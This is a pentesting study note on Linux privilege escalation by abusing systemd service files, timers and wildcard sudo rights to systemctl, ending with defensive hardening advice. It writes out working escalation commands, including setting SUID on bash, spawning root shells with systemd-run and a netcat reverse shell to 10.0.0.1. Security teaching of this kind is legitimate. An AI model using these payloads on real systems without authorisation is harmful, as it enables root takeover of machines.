---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.26 Systemd Abuse"
---

# Systemd Service File Abuse

## Introduction
Systemd is the initialization system and service manager adopted by almost all major modern Linux distributions (Ubuntu, Debian, RHEL, CentOS, Arch). It replaces older init systems like SysVinit and Upstart. Systemd is responsible for bootstrapping the user space and managing all system processes, which are defined as "units" (most commonly, service files ending in `.service`).

Because Systemd runs as PID 1 with root privileges, any misconfiguration in how services are defined, how they execute binaries, or who has permission to modify them presents a high-severity path for local privilege escalation. Systemd abuse primarily focuses on manipulating existing services to execute arbitrary payloads or creating new, malicious services.

## Anatomy of a Systemd Service File
A systemd service file is an INI-style configuration file that tells systemd how and when to start a process. These files are typically stored in:
- `/etc/systemd/system/` (Local configurations, highest priority)
- `/lib/systemd/system/` (Package-installed units)
- `/usr/lib/systemd/system/`

A basic service file (`backup.service`) looks like this:
```ini
[Unit]
Description=Automated System Backup

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/backup_script.sh
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

The critical directives for penetration testing are `ExecStart`, `ExecStartPre`, `ExecStartPost`, and `ExecReload`, which define the commands systemd executes. If the `User` directive is omitted or set to `root`, systemd runs the command as the root user.

## Vectors of Systemd Abuse

There are three primary vectors for escalating privileges via systemd:
1. Insecure file permissions on the `.service` file.
2. Insecure file permissions on the binary/script executed by the service.
3. Exploiting systemd Timers or unprivileged `systemctl` permissions.

### ASCII Diagram: Systemd Execution Flow & Hijacking

```text
+-------------------------------------------------------------------------+
|                      SYSTEMD SERVICE HIJACKING FLOW                     |
+-------------------------------------------------------------------------+
|                                                                         |
|  1. Systemd (PID 1 - Root) manages services                             |
|  +-------------------------------------------------------------+        |
|  | systemd daemon waiting for triggers (boot, timer, command)  |        |
|  +-----------------------------+-------------------------------+        |
|                                |                                        |
|                                v                                        |
|  2. Trigger: `sudo systemctl start backup.service`                      |
|                                |                                        |
|                                v                                        |
|  3. Systemd parses /etc/systemd/system/backup.service                   |
|  +-------------------------------------------------------------+        |
|  | [Service]                                                   |        |
|  | ExecStart=/usr/local/bin/backup.sh                          |        |
|  | User=root                                                   |        |
|  +-----------------------------+-------------------------------+        |
|                                |                                        |
|  +=============================|=====================================+  |
|  | ATTACKER INTERVENTION       v                                     |  |
|  |                                                                   |  |
|  | SCENARIO A: Writable .service file                                |  |
|  | -> Attacker changes ExecStart to /bin/nc 10.0.0.1 4444 -e /bin/sh |  |
|  |                                                                   |  |
|  | SCENARIO B: Writable backup.sh script                             |  |
|  | -> Attacker appends 'chmod +s /bin/bash' to backup.sh             |  |
|  +=============================|=====================================+  |
|                                |                                        |
|                                v                                        |
|  4. Systemd executes the directive as ROOT                              |
|  +-------------------------------------------------------------+        |
|  | Process spawns: Root Reverse Shell / SUID Bash Generation   |        |
|  +-------------------------------------------------------------+        |
+-------------------------------------------------------------------------+
```

### 1. Writable Systemd Service Files
If a system administrator incorrectly configures the file permissions of a `.service` file, allowing unprivileged users to modify it, an attacker can rewrite the configuration.

**Enumeration:**
```bash
find /etc/systemd/system -type f -writable 2>/dev/null
```
**Exploitation:**
Assume `vulnerable.service` is writable.
1. Modify the `ExecStart` directive to execute a malicious payload.
   ```ini
   [Service]
   ExecStart=/bin/bash -c "chmod +s /bin/bash"
   ```
2. For systemd to recognize the changes to the file, it must be reloaded. Usually, this requires root, but sometimes services restart automatically, or the attacker might have limited `sudo` rights to restart this specific service.
   `systemctl daemon-reload` (If possible)
   `sudo systemctl restart vulnerable.service`
3. Execute the resulting SUID bash: `/bin/bash -p`.

### 2. Writable Executable or PATH Issues
Even if the `.service` file is heavily protected, the underlying script or binary it executes might not be.

**Enumeration:**
Read the service file to find the target executable:
```bash
cat /etc/systemd/system/maintenance.service
# ExecStart=/opt/maintenance/cleanup.sh
```
Check permissions on the script:
```bash
ls -la /opt/maintenance/cleanup.sh
# -rwxrwxrwx 1 root root 120 Jun 9 10:00 /opt/maintenance/cleanup.sh
```
**Exploitation:**
Since the script is world-writable, append a payload:
```bash
echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash" >> /opt/maintenance/cleanup.sh
```
Wait for the service to run (e.g., if it's tied to a timer) or trigger it if you have the necessary `sudo` rights.

### 3. Exploiting Systemd Timers
Systemd utilizes `.timer` files as a modern alternative to Cron jobs. A timer triggers an associated service file on a schedule.

**Enumeration:**
```bash
systemctl list-timers --all
```
If an attacker discovers a timer executing a writable script or linked to a writable service file, they do not need to manually trigger the service; they simply inject the payload and wait for the timer to expire, similar to Cron job exploitation.

### 4. Bypassing Restrictions via Systemd Variables
If a service utilizes `EnvironmentFile` to load variables from a file that is writable by the attacker, this can be leveraged. By injecting arbitrary variables, an attacker might influence the behavior of the `ExecStart` binary, similar to an `LD_PRELOAD` attack, though systemd aggressively sanitizes the environment to prevent precisely this. However, application-specific variables might still lead to RCE.

## Creating Malicious Services (Sudo Misconfigurations)

Often, administrators grant developers `sudo` access to `systemctl` so they can manage application services without full root access.
```text
User dev may run the following commands on this host:
    (root) NOPASSWD: /bin/systemctl *
```
The wildcard `*` allows the user to run *any* systemctl command. This is fatal. An attacker can use this to create and start a brand new service that grants root access.

**Exploitation via systemd-run:**
The `systemd-run` command creates transient services on the fly.
```bash
sudo systemctl status   # To verify access
sudo systemd-run -t /bin/bash
```
This drops the attacker straight into a root shell.

**Exploitation via link:**
If `systemd-run` is blocked but `systemctl link` or `enable` is allowed with wildcards:
1. Create a malicious service file in `/tmp/pwn.service`.
2. Link it: `sudo systemctl link /tmp/pwn.service`
3. Start it: `sudo systemctl start pwn.service`

## Defensive Mitigation Strategies

1. **Strict File Permissions:** Service files (`/etc/systemd/system/*`) must be owned by `root` with `644` permissions. Under no circumstances should they be world-writable or writable by unprivileged groups.
2. **Secure Scripts:** Any script referenced in `ExecStart` must also have strict permissions (`755` or `700`, owned by root). Avoid putting scripts in `/tmp` or `/var/tmp`.
3. **Sudo Restrictions:** Never grant `sudo systemctl *`. Be explicitly declarative:
   `User dev may run: (root) /bin/systemctl restart myapp.service`
4. **Least Privilege in Systemd:** Utilize systemd's built-in hardening features. If a service doesn't need root, use `User=nobody` or a specific application user. Use directives like `ProtectSystem=strict`, `ProtectHome=yes`, and `NoNewPrivileges=yes` to sandbox the service, heavily limiting what an attacker can do even if they hijack the execution flow.

## Chaining Opportunities
- Often chained with [[14 - Sudo Misconfigurations]] when wildcards are used in `/etc/sudoers`.
- Links closely with [[04 - Enumerating Automated Tasks]] to find hidden `.timer` units.
- Writable script exploitation connects back to [[10 - World Writable Files and Directories]].

## Related Notes
- [[22 - Wildcard Injection in Cron]]
- [[27 - D-Bus Interface Misconfigurations]]
- [[21 - Bash Script Weaknesses]]
